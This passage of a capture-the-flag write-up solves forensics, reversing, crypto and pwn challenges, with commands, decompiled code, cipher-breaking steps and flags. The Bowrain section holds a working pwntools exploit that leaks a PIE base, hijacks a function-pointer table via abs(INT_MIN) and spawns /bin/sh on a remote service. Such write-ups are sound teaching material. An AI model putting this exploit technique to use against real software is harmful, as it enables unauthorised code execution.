client certificate we need to provide. But naturally, there is only a public key in the certificate:\n\n    Subject Public Key Info:\n        Public Key Algorithm: id-ecPublicKey\n            Public-Key: (256 bit)\n            pub: \n                04:65:18:ab:8d:b3:c5:d4:65:f1:65:f0:85:08:1c:\n                56:63:18:47:ad:38:b3:3e:b7:36:57:bd:e4:15:eb:\n                f8:81:4d:c0:ed:43:32:9b:52:82:47:8c:97:e1:5f:\n                96:a5:1b:e0:63:75:1b:6d:fb:42:40:a1:65:08:93:\n                83:94:80:7b:eb\n            ASN1 OID: prime256v1\n\nTo make this work we need the private key. Luckily we have dozens of them. Let's extract the public keys from all of our RSA keys:\n\n    for key in rsa/*; do\n      openssl rsa -in \"$key\" -text -noout\n    done\n\nNope, how about the EC keys?\n\n    for key in ec/*; do\n      openssl ec -in \"$key\" -text -noout\n    done\n\nNo luck! So what about the binary files? Now that we have a server to access, we will probably find the flag on the server, not in the files. If we look at all the binary files in a hexeditor, we can notice something – every single one of them starts with an ASCII `0`. [Sounds familiar](https://www.cryptosys.net/pki/rsakeyformats.html).\n\n> Binary DER-encoded format. This is sometimes called ASN.1 BER-encoded (there is a subtle difference between BER- and DER-encodings: DER is just a stricter subset of BER). The most compact form. If you try to view the file with a text editor it is full of \"funny\" characters. The first character in the file is almost always a '0' character (0x30).\n\nSo let's extract the public keys from these as well:\n\n    for key in binary/*; do\n      openssl ec -in \"$key\" -inform DER -text -noout\n    done\n\nOne of them in particular is useful:\n\n    $ openssl ec -in binary/ddcb -inform DER -text -noout\n    read EC key\n    Private-Key: (256 bit)\n    priv:\n        13:75:f1:f0:66:84:74:e5:5e:f4:03:2b:e3:92:38:\n        39:47:8d:10:e4:10:c4:2d:0d:a3:36:7b:21:e4:a7:\n        25:53\n    pub: \n        04:65:18:ab:8d:b3:c5:d4:65:f1:65:f0:85:08:1c:\n        56:63:18:47:ad:38:b3:3e:b7:36:57:bd:e4:15:eb:\n        f8:81:4d:c0:ed:43:32:9b:52:82:47:8c:97:e1:5f:\n        96:a5:1b:e0:63:75:1b:6d:fb:42:40:a1:65:08:93:\n        83:94:80:7b:eb\n    ASN1 OID: prime256v1\n    NIST CURVE: P-256\n\nThe `pub` section matches what we have in our client certificate. I tried for a bit to make `curl` work with the certificate + the private key (converted to PEM format), but no luck, the server kept responding with the same error. So:\n\n    openssl s_client -key binary/ddcb -cert cert/6c8e -connect mikey.ctf.rocks:443\n\nAnd indeed, we are flooded with HTML. After opening this, we see a nice ASCII art image, and the flag hiding among the text!\n\n![](screens/allthekeys.png)\n\n`sctf{th3_M4tr1x_1s_4_5y5t3m_N30}`\n\n## 51 Misc / Everywhere ##\n\n**Description**\n\n> Too much information to decode.\n\n**Files provided**\n\n - [`everywhere.tar.gz`](files/everywhere.tar.gz) - containing `everywhere`, a JPEG file\n\n**Solution**\n\nThe JPEG shows some typical matrix-y green text visuals. Looking at the EXIF chunks, metadata, and hexdump reveals nothing of interest. Apparently this is just a JPEG image and nothing more. Based on the hint I tried to extend the canvas of the JPEG image, but no, there is just enough data encoded to fill the canvas.\n\nSince the challenge is called everywhere, let's look everywhere. The background video playing on the actual CTF submission server is also matrix-y. But it also seems very much like an excerpt from an actual movie (Animatrix maybe?), so modifying that to include the flag would be a lot of effort.\n\nHow about the Internet? Using a reverse image search, we can search for the picture we have. And there are many matches. [Some of them](https://manshoor.com/uploads/editor/source/Westworld4%40manshoor.com.jpg?1478435393695) match the dimensions of our file exactly – 960x678. The matches are found on regular websites, it would be impossible to sneak a flag in there and expect people to find it. So after downloading a matching image from the Internet, we can compare it to the one we've been given. Putting the two in Photoshop one on top of the other, we can use the \"Difference\" blending mode to only see where the images don't match. And indeed, there is a single line that was added, here made somewhat brigther (hopefully more readable):\n\n![](screens/everywhere.png)\n\n`sctf{y0u_411_100k_th3_54m3_t0_m3}`\n\n(I wonder if anybody solved this by just noticing the flag in the given image.)\n\n## 51 Misc / Mr.reagan ##\n\n**Description**\n\n> Agent Smith got this from Mr. Reagan, a EMP was activated nearby, or?\n\n**Files provided**\n\n - `mrreagan.tar.gz` - containing `mrreagan`, a 50 MiB disk image\n\n**Solution**\n\nAfter mounting the image, we see that it is an NTFS filesystem. We can see the `$RECYCLE.BIN` folder, the `System Volume Information` folder, but also an `EFSTMPWP`. If we search for `EFSTMPWP`, we [find](http://www.majorgeeks.com/content/page/what_is_the_efstmpwp_folder_and_can_you_delete_it.html) it is an artefact of using Cipher on Windows to erase data from empty space on a filesystem, thereby making it irrecoverable (unlike just unlinking a file). So this would be the EMP that the challenge description mentions. But the description also has a question mark!\n\nWe can open the image in [Autopsy](http://sleuthkit.org/autopsy/index.php), always useful for Windows forensics. And indeed, there are some orphan files:\n\n![](screens/mrreagan1.png)\n\n![](screens/mrreagan2.png)\n\nAll of these show some ASCII data that looks quite like Base64. One of them in particular produces `sctf{` after decoding, so clearly this is the right direction. But some of the others produce garbage? Let's extract the five files.\n\n    $ cat export/*\n    c2N0ZnszbD \n    NjdHIwbTRn \n    bjN0MWNfcH \n    VsNTNfdzRz \n    X2Y0azN9Cg \n    $ cat export/* | base64 -D\n    sctf{3l3ctr0m4gn3t1c_pul53_w4s_f4k3}\n\nAnd now it works. The problem was that the Base64 data first needed to be concatenated, then decoded, otherwise the decoded bits were offset.\n\n`sctf{3l3ctr0m4gn3t1c_pul53_w4s_f4k3}`\n\n## 51 Rev / Bluepill ##\n\n**Description**\n\n> This your last chance. After this there is no turning back. You take the blue pill, the story ends. You wake up in your bed and believe whatever you want to. You take the red pill, you stay in Wonderland, and I show you how deep the rabbit hole goes. Remember, all I'm offering is the truth. Nothing more. This challenge was sponsored by ATEA! If you are a local student player you are eligible to turn in the flag at the ATEA booth for a prize!\n\n**Files given**\n\n - [`bluepill.tar.gz`](files/bluepill.tar.gz) - archive containing\n   - `bluepill.ko`\n   - `init`\n   - `run.sh`\n   - `tiny.kernel`\n\n**Solution**\n\nA kernel object is given, which I am not very familiar with, however, `pill_choice` is the critical function, obviously.\n\nThe basic logic is to get input from function `strncpy_from_user`, and test the input.\n\n```c\nv5 = file_open(\"/proc/version\");\nif ( v5 )\n{\n  v6 = v5;\n  file_read(v5, (unsigned __int8 *)magic, 0x1F4u);\n  v7 = v6;\n  v8 = &choice_35697;\n  filp_close(v7, 0LL);\n  if ( strlen((const char *)&choice_35697) > 0xB )\n  {\n    v9 = checks_35680;\n    while ( 1 )\n    {\n      v10 = 0LL;\n      memset(&v21, 0, 0x19uLL);\n      *(_QWORD *)digest = 0LL;\n      v19 = 0LL;\n      s2 = 0LL;\n      calc(v8, 4uLL, digest); //calculate md5 for 4 bytes\n      do\n      {\n        v11 = magic[v10];\n        v12 = digest[v10];\n        v13 = 2 * v10++;\n        sprintf((char *)&s2 + v13, \"%02x\", v11 ^ v12);\n      }\n      while ( v10 != 16 );\n      if ( memcmp(v9, &s2, 0x20uLL) )\n        break;\n      v8 += 4;\n      v9 += 33;\n      if ( v8 == &choice_35697 + 12 )\n      {\n        printk(&success);\n          //...\n```\n\nThe length of string must be larger than 11, and then only 12 bytes are useful, which are grouped as 4 bytes and their md5 are calculated. To know `calc` is calculating md5, simply inspect the constants and global array data used and search them on google. However, in some other reverse challenges the hash algorithm may be modified, so this approach can't be 100% sure.\n\nThen the md5 hashes will be `xor` with the content from `/proc/version`, then compare with the \n\n```assembly\n.data:0000000000000800 checks_35680    db '40369e8c78b46122a4e813228ae8ee6e',0\n.data:0000000000000821 aE4a75afe114e44 db 'e4a75afe114e4483a46aaa20fe4e6ead',0\n.data:0000000000000842 a8c3749214f4a91 db '8c3749214f4a9131ebc67e6c7a86d162',0\n```\n\nso to get md5 hashes, simply `xor` the hex above with content in `/proc/version`, as shown.\n\n```python\nimport hashlib\nfrom pwn import *\nproc_version = \"Linux version 4.17.0-rc4+ (likvidera@ubuntu) (gcc version 7.2.0 (Ubuntu 7.2.0-8ubuntu3.2)) #9 Sat May 12 12:57:01 PDT 2018\"\n# obtained from cat /proc/version within the kernel given\nkeys = [\"40369e8c78b46122a4e813228ae8ee6e\", \"e4a75afe114e4483a46aaa20fe4e6ead\", \"8c3749214f4a9131ebc67e6c7a86d162\"]\n\ndef get_hashes():\n\tret = []\n\tfor i in xrange(0,3):\n\t\tone_hashes = \"\"\n\t\thex_data = keys[i].decode(\"hex\")\n\t\tfor i in xrange(0,len(hex_data)):\n\t\t\tone_hashes += chr(ord(proc_version[i]) ^ ord(hex_data[i]))\n\t\tret.append(one_hashes)\n\treturn ret\n\ndef md5(string):\n\tm = hashlib.md5()\n\tm.update(string)\n\treturn m.digest()\n\nhashes = get_hashes()\nfor i in xrange(0, 3):\n\tprint \"\".join(\"{:02x}\".format(ord(c)) for c in hashes[i])\n\n#0c5ff0f900941747d69b7a4de4c8da40\n#a8ce348b696e32e6d619c34f906e5a83\n#c05e2754376ae75499b5170314a6e54c\n#crack the md5 using this website https://cmd5.org/\n#g1Mm3Th3r3D1\n```\n\nHowever, this is not the flag, obtain the flag by accessing the kernel object.\n\n```bash\n$ echo \"g1Mm3Th3r3D1\" > /proc/bluepill\n$ cat flag\n```\n\n## 261 Pwn / Bowrain ##\n\n**Description**\n\n> A little known fact about Elon Musk is that he invented the matrix as a scheme to sell trendy late 90s screensavers to fund his space adventures. That sneaky SOB left his beta screensaver app online and I think it has a backdoor.\n> \n> Service: nc pwn2.trinity.neo.ctf.rocks 54321 | nc 159.65.80.92 54321\n\n**Files given**\n\n - `bowrain.tar.gz`\n\n**Solution**\n\n### Problems ###\n\n1. no null termination in function `sub_CB0`, which is used to get a string, so PIE base address can be leaked.\n2. `abs(INT_MIN)` is still a negative number\n3. `x % n` is negative when x is negative\n\nin function `main`\n\n```c\n while ( 1 )\n  {\n    v4[0] = get_number();\n    if ( v4[0] == -1 )\n    {\n      printf(\"\\x1B[31;1merror:\\x1B[0m not a number: %s\\n\", ::a1, *(_QWORD *)v4, v5);\n        // leak PIE possible\n    }\n    else\n    {\n      v4[1] = abs(v4[0]) % 7;//can be negative if v4[0] is 2147483648\n      memset(::a1, 0, endptr - (char *)::a1);\n      v3 = (void (__fastcall *)(char *, _QWORD))*(&off_2030A0 + v4[1]);\n      //will access a function pointer that can be manipulated by input if negative\n      v3(++endptr, 0LL);\n      //++endptr will point to the address just after the null terminator of input\n    }\n    print_choice();\n```\n\nand in `.data`\n\n```assembly\n.data:0000000000203020 a1              db 30h, 7Fh dup(0)\n.data:00000000002030A0 off_2030A0      dq offset sub_AE0\n.data:00000000002030A8                 dq offset sub_B1A\n.data:00000000002030B0                 dq offset sub_B54\n.data:00000000002030B8                 dq offset sub_B8E\n.data:00000000002030C0                 dq offset sub_BC8\n.data:00000000002030C8                 dq offset sub_C02\n.data:00000000002030D0                 dq offset sub_C3C\n```\n\nbuffer that holds the input is contiguous with the function pointers.\n\nFirst of all, since there is no null termination, we can leak address of `sub_AE0` to get base address.\n\nSecondly, if the index to access the function pointer table is negative, we can hijack the control flow to function `system`.\n\n```python\nfrom pwn import *\n\ng_local=False\n#context.log_level='debug'\nif g_local:\n\tsh = process('./bowrain')#env={'LD_PRELOAD':'./libc.so.6'}\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"159.65.80.92\", 54321)\n\nsh.send(\"A\" * 0x80 + \"\\n\")\nsh.recvuntil(\"A\" * 0x80)\nleak = sh.recvuntil(\": \")[:6] + \"\\x00\\x00\"\nbase = u64(leak) - 0xAE0\nprint hex(base)\n\npayload = \"2147483648\" + \"\\x00\" + \"/bin/sh\\x00\"\npayload += \"A\" * 5\nassert len(payload) == 0x18\npayload += ((0x80 - len(payload)) / 8) * p64(base + 0x958)\n# spray the address of system, \n# so any access of function pointer table with negative index > -7 (by % operation)\n# will give address of system\n# excact number can be determined by debugging, but spraying is more convinient\nsh.send(payload + \"\\n\")\nsh.interactive()\n```\n\n## 485 Crypto / The note ##\n\n**Description**\n\n> I found this strange string of numbers inside a copy of Отцы и дети by Ива́н Серге́евич Турге́нев that Cypher left inside a postbox. Can you help me figure out what it is? NOTE: the flag is not encoded in the usual format, enter it as sctf{FLAG} with the flag in caps\n\n**Files given**\n\n - `emsg.tar.gz` - containing the cipher text [`emsg.txt`](scripts/note/emsg.txt), with 682 pairs of decimal digits separated by spaces\n\n**Solution**\n\nGiven the hint mentioning a book and the cipher text being small numbers, my first thought was that this is a book cipher. I made several attempts:\n\n - using the original Russian text\n   - number = word in text, take first letter of word\n   - number = letter in text\n - same with English text\n\nBut all of it looked rather nonsensical. At this point there were still no solves, and the admin of the challenge hinted that \"knowing what the book was about is useful\". So having a look at the [Wikipedia page](https://en.wikipedia.org/wiki/Fathers_and_Sons_(novel)), we see that the central theme is basically ... nihilism. Is this a key? A crib?\n\nWhile exploring some cryptography pages on Wikipedia for some other challenges, I noticed something in the classical cryptography section: [Nihilist cipher](https://en.wikipedia.org/wiki/Nihilist_cipher)! Sounds like exactly what we need. I fumbled about a bit still trying to solve it like a substitution cipher for some reason, but then I looked into how to break the cipher properly. I plotted the frequency of each number in the cipher text:\n\n           0   1    2    3    4    5    6    7    8    9\n         -----------------------------------------------\n    0   |  0   0    0    0    0    0    0    0    0    0\n    1   |  0   0    0    0    0    0    0    0    0    0\n    2   |  0   0    0    0    4    5   10    6    0    0\n    3   |  0   0    2    8   17    9    5    2    1    0\n    4   |  0   0    2    8   22   43   43   26    3    0\n    5   |  0   0    4   20   21   19   25   24   21   10\n    6   |  0   0    4    4   28   36   36   15   23    0\n    7   |  4   0    0    7   30   13   11   28    4    2\n    8   |  7   0    0   13    3    8   15   11    0    9\n    9   |  2   0    0    1    2    1    2    2    0    1\n\n(Here I was trying to assign the 43 to the most common English letter, and so on, but that is clearly not the right approach.)\n\nIt is notable that there are no low numbers, and it seems like the lower right corner is actually a continuation (i.e. overflow). This all makes sense with the nihilist cipher, which works like this:\n\n 1. a 5x5 polybius square is created based on a keyword - basically a substitution alphabet with 25 letters, where each letter in the cipher text is identified by its row and column in the square\n 2. the plain text is encoded into numbers using the polybius square\n 3. the key (another one) is also encoded into numbers using the polybius square\n 4. the cipher text is created by taking each number from step 2 and adding it to a number from step 3, repeating the key numbers periodically as needed\n\nThere are some serious flaws in the cipher like this. In particular:\n\n - a substitution cipher is trivially broken if we have enough data (the cipher text is quite long here), or we have cribs (we have that as well), or we know that the plain text is English (a fair assumption)\n - any of the numbers from steps 2 and 3 have to be valid polybius square coordinates, i.e. `1 ≤ row ≤ 5`, `1 ≤ column ≤ 5`, so `24` is a valid coordinate, while `30` is not\n\nWith this in mind, we can start breaking the cipher. The first step is to get rid of the additive key. We can try to find out what the key length is before doing anything else (see [SUCTF writeup - cycle](https://github.com/Aurel300/empirectf/blob/master/writeups/2018-05-26-SUCTF/README.md#465-misc--cycle)), and this is what I did during the CTF. But as it turns out, it is unnecessary.\n\nThe process is as follows:\n\n - for each possible key length `Nk`, `1, 2, ...`\n   - put the cipher data into `Nk` columns\n   - for each column `i` (corresponding to a single key character)\n     - for each possible key character value `k[i]` that is a valid polybius coordinate `11, 12, 13, 14, 15, 21, ..., 55`\n       - subtract `k[i]` from all values in column `i`\n       - if they are all valid polybius coordinates, this is a possible value for `k[i]`\n   - if all `k[i]`s are valid, this is a valid key (and we can stop)\n\nWith a shorter cipher text, there might be some ambiguity with respect to key selection. But basically, if the plain text for each column for a given key length includes `11` and `55`, or `51` and `15`, i.e. opposite corners of the original polybius square, then the key value we choose for that column is unique, and any other key value would result in the plain text being outside the polybius square.\n\nOur cipher text is long enough and the shortest key we can find to uniquely place all of the plain text within valid polybius coordinates is:\n\n    21, 33, 45, 13, 42, 32, 33, 33\n\nWe don't know what this key is without breaking the polybius square, but we will soon find out. After removing this additive key from the cipher text, we are left with:\n\n    12 41 52 31 41 34 32 12 34 14 54 22 41 35 22 13 44 35 32 14 34 34 44 44 13\n    14 25 14 35 12 31 13 44 13 21 13 33 15 35 41 52 35 14 11 22 54 42 31 13 44\n    14 11 54 41 45 34 32 25 31 12 15 35 41 52 32 31 14 51 13 21 13 13 35 41 45\n    12 11 32 23 13 12 31 13 34 14 12 44 32 53 24 41 44 35 32 35 13 54 13 14 44\n    11 32 14 34 14 33 11 41 14 34 13 34 21 13 44 41 24 34 41 44 42 31 13 45 11\n    22 44 13 52 14 35 23 22 14 35 31 13 33 42 54 41 45 24 32 35 23 14 33 33 14\n    21 41 45 12 31 32 11 52 31 13 44 13 14 21 41 45 12 11 32 52 41 45 33 23 33\n    32 15 13 12 41 24 41 44 25 13 12 14 21 41 45 12 12 31 32 11 31 41 44 44 32\n    21 33 13 52 41 44 33 23 14 35 23 21 13 14 21 33 13 12 41 25 13 12 21 14 22\n    15 12 41 12 31 13 34 14 12 44 32 53 11 41 12 31 14 12 32 22 14 35 13 35 32\n    41 54 12 31 13 44 13 11 12 41 24 34 54 33 32 24 13 32 35 12 31 32 11 14 34\n    14 55 32 35 25 52 41 44 33 23 32 33 41 35 25 12 41 13 35 32 41 54 14 25 14\n    32 35 12 31 13 44 13 33 14 53 32 35 25 14 35 23 33 13 11 11 11 12 44 13 11\n    11 24 45 33 33 32 24 13 12 31 14 12 12 31 13 34 14 12 44 32 53 42 44 41 51\n    32 23 13 11 14 35 23 14 33 33 12 31 41 11 13 33 32 12 12 33 13 33 45 53 45\n    44 32 13 11 12 31 14 12 11 32 34 42 33 54 23 41 35 41 12 13 53 32 11 12 32\n    35 12 31 13 44 13 14 33 52 41 44 33 23 14 35 54 34 41 44 13 32 24 54 41 45\n    14 44 13 52 32 33 33 32 35 25 12 41 35 13 25 41 12 32 14 12 13 42 33 13 14\n    11 13 33 13 14 51 13 14 35 41 12 13 52 32 12 31 12 31 13 12 32 34 13 14 35\n    23 42 33 14 22 13 12 41 31 41 33 23 11 45 22 31 14 34 13 13 12 32 35 25 32\n    35 11 32 23 13 14 35 13 35 51 13 33 41 42 13 33 14 21 13 33 33 13 23 11 22\n    12 24 53 12 31 13 34 14 12 44 32 53 22 14 35 21 13 34 41 44 13 44 13 14 33\n    12 31 14 35 12 31 32 11 52 41 44 33 23 53 41 35 12 31 13 22 44 41 11 11 52\n    14 54 21 13 12 52 13 13 35 12 31 13 52 14 21 14 11 31 14 35 23 13 44 32 13\n    14 12 11 13 51 13 35 41 22 33 41 22 15 32 35 12 31 13 14 24 12 13 44 35 41\n    41 35 32 14 34 14 35 53 32 41 45 11 33 54 52 14 32 12 32 35 25 24 41 44 54\n    41 45 44 42 44 41 34 42 12 44 13 42 33 54 54 41 45 44 11 12 44 45 33 54 34\n    44 44 13 14 25 14 35\n\n(So now you can see all of the numbers are valid polybius coordinates.)\n\nDespite using two-digit numbers, there are really only 25 unique values, so this is a substitution cipher. The most common value in any text is generally `0x20`, a space character. However, when using a polybius square, there are only 25 characters to choose from, so the spaces are omitted, along with any punctuation or indication of letter case. `I` and `J` are generally merged, since the latter is quite rare in English text.\n\nWe can refer to a [frequency table like this](http://sxlist.com/techref/method/compress/etxtfreq.htm) to gain a lot of useful insight as to what we might expect to see in the plain text. In particular, the letters appearing in the plain text will likely be \"ETAOINSH...\", with the most frequent letter first. We will consider \"THE\" to be a crib, and the most common trigram / three-letter sequence in the plain text. With the crib only, we construct a temporary polybius square:\n\n      a  T  E  d  e\n      f  g  h  i  k\n      H  m  n  o  p\n      q  r  s  t  u\n      v  w  x  y  z\n\nThis also has the advantage that many of the later letters might already be in their correct position, as long as the keyword doesn't use them (this is why \"ZEBRA\" shown as an example on the Wikipedia page for the nihilist cipher is a good keyword). Then we deduce letters one at a time to make sense of the plain text. At some point knowing the plot of The Matrix helps, and we can find the relevant section in the film's script.\n\n([full script with interactive decoding here](scripts/note/Decode.hx))\n\n    --- Interactive decode mode ---\n    Current square:\n      a  T  E  d  e\n      f  g  h  i  k\n      H  m  n  o  p\n      q  r  s  t  u\n      v  w  x  y  z\n    Frequency chart:\n     33 61 82 62  5\n     14 14 18 12 13\n     33 50 41 23 46\n     55 11  0 43 17\n      5 16 10 17  1\n    Current plain text:\n    TqwHqomTodygqpgEtpmdoottEdkdpTHEtEfEnepqwpdagyrHEtdayquomkHTepqwmHdvEfEEpquTamhETHEodTtmxiqtpmpEyEdtamdodnaqdoEofEtqioqtrHEuagtEwdphgdpHEnryquimphdnndfquTHmawHEtEdfquTamwqunhnmeETqiqtkETdfquTTHmaHqttmfnEwqtnhdphfEdfnETqkETfdgeTqTHEodTtmxaqTHdTmgdpEpmqyTHEtEaTqioynmiEmpTHmadodzmpkwqtnhmnqpkTqEpmqydkdmpTHEtEndxmpkdphnEaaaTtEaaiunnmiETHdTTHEodTtmxrtqvmhEadphdnnTHqaEnmTTnEnuxutmEaTHdTamornyhqpqTExmaTmpTHEtEdnwqtnhdpyoqtEmiyqudtEwmnnmpkTqpEkqTmdTErnEdaEnEdvEdpqTEwmTHTHETmoEdphrndgETqHqnhaugHdoEETmpkmpamhEdpEpvEnqrEndfEnnEhagTixTHEodTtmxgdpfEoqtEtEdnTHdpTHmawqtnhxqpTHEgtqaawdyfETwEEpTHEwdfdaHdphEtmEdTaEvEpqgnqgempTHEdiTEtpqqpmdodpxmquanywdmTmpkiqtyqutrtqorTtErnyyqutaTtunyottEdkdp\n    Replace: d\n    With:    a\n    Current square:\n      a  T  E  A  e\n      f  g  h  i  k\n      H  m  n  o  p\n      q  r  s  t  u\n      v  w  x  y  z\n    Frequency chart:\n     33 61 82 62  5\n     14 14 18 12 13\n     33 50 41 23 46\n     55 11  0 43 17\n      5 16 10 17  1\n    ...\n    ...\n    ...\n    Current square:\n      S  T  E  A  K\n      B  C  D  F  G\n      H  I  L  M  N\n      O  P  s  R  U\n      V  W  X  Y  z\n    Frequency chart:\n     33 61 82 62  5\n     14 14 18 12 13\n     33 50 41 23 46\n     55 11  0 43 17\n      5 16 10 17  1\n    Current plain text:\n    TOWHOMITMAYCONCERNIAMMRREAGANTHEREBELKNOWNASCYPHERASYOUMIGHTKNOWIHAVEBEENOUTSIDETHEMATRIXFORNINEYEARSIAMALSOAMEMBEROFMORPHEUSCREWANDCANHELPYOUFINDALLABOUTHISWHEREABOUTSIWOULDLIKETOFORGETABOUTTHISHORRIBLEWORLDANDBEABLETOGETBACKTOTHEMATRIXSOTHATICANENIOYTHERESTOFMYLIFEINTHISAMAzINGWORLDILONGTOENIOYAGAINTHERELAXINGANDLESSSTRESSFULLIFETHATTHEMATRIXPROVIDESANDALLTHOSELITTLELUXURIESTHATSIMPLYDONOTEXISTINTHEREALWORLDANYMOREIFYOUAREWILLINGTONEGOTIATEPLEASELEAVEANOTEWITHTHETIMEANDPLACETOHOLDSUCHAMEETINGINSIDEANENVELOPELABELLEDSCTFXTHEMATRIXCANBEMOREREALTHANTHISWORLDXONTHECROSSWAYBETWEENTHEWABASHANDERIEATSEVENOCLOCKINTHEAFTERNOONIAMANXIOUSLYWAITINGFORYOURPROMPTREPLYYOURSTRULYMRREAGAN\n    Replace: z\n    With:    z\n    Current square:\n      S  T  E  A  K\n      B  C  D  F  G\n      H  I  L  M  N\n      O  P  s  R  U\n      V  W  X  Y  Z\n    Frequency chart:\n     33 61 82 62  5\n     14 14 18 12 13\n     33 50 41 23 46\n     55 11  0 43 17\n      5 16 10 17  1\n    Current plain text:\n    TOWHOMITMAYCONCERNIAMMRREAGANTHEREBELKNOWNASCYPHERASYOUMIGHTKNOWIHAVEBEENOUTSIDETHEMATRIXFORNINEYEARSIAMALSOAMEMBEROFMORPHEUSCREWANDCANHELPYOUFINDALLABOUTHISWHEREABOUTSIWOULDLIKETOFORGETABOUTTHISHORRIBLEWORLDANDBEABLETOGETBACKTOTHEMATRIXSOTHATICANENIOYTHERESTOFMYLIFEINTHISAMAZINGWORLDILONGTOENIOYAGAINTHERELAXINGANDLESSSTRESSFULLIFETHATTHEMATRIXPROVIDESANDALLTHOSELITTLELUXURIESTHATSIMPLYDONOTEXISTINTHEREALWORLDANYMOREIFYOUAREWILLINGTONEGOTIATEPLEASELEAVEANOTEWITHTHETIMEANDPLACETOHOLDSUCHAMEETINGINSIDEANENVELOPELABELLEDSCTFXTHEMATRIXCANBEMOREREALTHANTHISWORLDXONTHECROSSWAYBETWEENTHEWABASHANDERIEATSEVENOCLOCKINTHEAFTERNOONIAMANXIOUSLYWAITINGFORYOURPROMPTREPLYYOURSTRULYMRREAGAN\n\nThe polybius square is based on the keyword `STEAK` - very cipher-like. We can now decode the key:\n\n    21, 33, 45, 13, 42, 32, 33, 33\n    B   L   U   E   P   I   L   L\n\nAnd here is the decoded plain text with whitespace and some punctuation inserted:\n\n> TO WHOM IT MAY CONCERN,\n> \n> I AM MR. REAGAN, THE REBEL KNOWN AS CYPHER. AS YOU MIGHT KNOW, I HAVE BEEN OUTSIDE THE MATRIX FOR NINE YEARS. I AM ALSO A MEMBER OF MORPHEUS' CREW AND CAN HELP YOU FIND ALL ABOUT HIS WHEREABOUTS. I WOULD LIKE TO FORGET ABOUT THIS HORRIBLE WORLD AND BE ABLE TO GET BACK TO THE MATRIX SO THAT I CAN ENIOY THE REST OF MY LIFE IN THIS AMAZING WORLD. I LONG TO ENIOY AGAIN THE RELAXING AND LESS STRESS FUL LIFE THAT THE MATRIX PROVIDES AND ALL THOSE LITTLE LUXURIES THAT SIMPLY DO NOT EXIST IN THE REAL WORLD ANYMORE. IF YOU ARE WILLING TO NEGOTIATE, PLEASE LEAVE A NOTE WITH THE TIME AND PLACE TO HOLD SUCH A MEETING INSIDE AN ENVELOPE LABELLED:\n> \n> SCTFXTHEMATRIXCANBEMOREREALTHANTHISWORLDX\n> \n> ON THE CROSSWAY BETWEEN THE WABASH AND ERIE AT SEVEN O'CLOCK IN THE AFTERNOON. I AM ANXIOUSLY WAITING FOR YOUR PROMPT REPLY.\n> \n> YOURS TRULY,\n> \n> MR. REAGAN\n\n(Note `ENIOY` spelled without the `J`.)\n\n`sctf{THEMATRIXCANBEMOREREALTHANTHISWORLD}`\n\n## 51 Crypto / The oracle ##\n\n**Description**\n\n> The Oracle gave me this note. She mentioned it uses a substitution cipher. She also reminded me that there is no flag.\n\n**Files given**\n\n - `oracle.tar.gz` - archive containing [`emsg.txt`](scripts/oracle/emsg.txt) looking like binary data\n\n**Solution**\n\nThe file we have been given indeed is just some text encrypted using a substitution cipher. See [above](#485-crypto--the-note) for how to approach this. The difference for this one is that there are more distinct values, since we are not limited to a polybius square. As such, the most common character is most likely `0x20`, a space. Replacing the most common occurring character `0x68` with `0x20` and everything else with question marks, we get:\n\n> ???? ????????????? ???? ??? ?? ???? ???? ??? ???????? ???? ??? ???? ?? ????? ????? ????? ??? ????????? ???? ???????? ?????????? ?????? ??????? ?? ????? ???????????? ??? ???? ????? ??????? ??????? ???????????????????????????????????????????????????????????????????? ?????????? ???????\n\nWhich seems fairly good, all of these could easily be English words. The only one that stands out is the 68 character one - the flag. We should exclude that for our frequency analysis.\n\nI did try using `the` as a crib for this one, but this failed. As you'll soon see, the text doesn't actually include this word. So instead, we just use letter frequencies and deduction.\n\n([interactive decoder script here](scripts/oracle/Solve.hx))\n\n    --- Interactive decode mode ---\n    Frequency chart:\n       0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F\n    0  0  0  0  0  0  0  0  2  0  1  1  0  1  0  0  0\n    1  0  4  0  0  0  0  0 12  0  0  0  0  3  1  0  1\n    2 12 14  0  0 18  3 14 14  0  9  2  2  9 18  4  5\n    3  0  5  0  1  0  1  0  0  1  0 11 12 11 11  3  6\n    4  0  0 10  0  0  0  0  0  0  0  0  0  0  0  0  0\n    5  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0\n    6  0  0  0  0  3  0  4  0 33  0  0  0  0  0  0  0\n    7  0  0  0  0  0  0  0  1  3  8  0  0  4  1  0  4\n    8  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0\n    9  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0\n    A  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0\n    B  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0\n    C  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0\n    D  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0\n    E  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0\n    F  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0  0\n    Current plain text:\n        0 1 2 3 4 5 6 7 8 9 |  0  1  2  3  4  5  6  7  8  9\n      0 ? ? ? ?   ? ? ? ? ? | 0C 2D 29 3A 68 1C 3A 21 26 21\n     10 ? ? ? ? ? ? ? ?   ? | 3C 31 64 42 42 11 27 3D 68 3F\n     20 ? ? ?   ? ? ?   ? ? | 21 24 24 68 2F 2D 3C 68 21 26\n     30   ? ? ? ?   ? ? ? ? | 68 24 27 3E 2D 68 3F 21 3C 20\n     40   ? ? ?   ? ? ? ? ? | 68 1C 20 2D 68 07 26 2D 66 42\n     50 ? ? ?   ? ? ? ?   ? | 11 27 3D 68 3F 21 24 24 68 3B\n     60 ? ?   ? ? ? ?   ? ? | 2D 2D 68 3F 20 29 3C 68 26 27\n     70   ? ? ? ? ?   ? ? ? | 68 27 3C 20 2D 3A 68 20 3D 25\n     80 ? ?   ? ? ? ? ?   ? | 29 26 68 29 24 21 3E 2D 68 20\n     90 ? ?   ? ? ? ? ? ? ? | 29 3B 68 3B 2D 2D 26 66 42 11\n    100 ? ?   ? ? ? ?   ? ? | 27 3D 68 3F 21 24 24 68 3C 3A\n    110 ? ? ? ? ? ?   ? ? ? | 2D 3B 38 29 3B 3B 68 2A 27 3D\n    120 ? ? ? ? ? ? ?   ? ? | 26 2C 29 3A 21 2D 3B 68 26 27\n    130 ? ? ? ?   ? ? ? ? ? | 2A 27 2C 31 68 2C 3A 2D 29 25\n    140 ? ?   ? ?   ? ? ? ? | 2D 2C 68 27 2E 68 2F 27 21 26\n    150 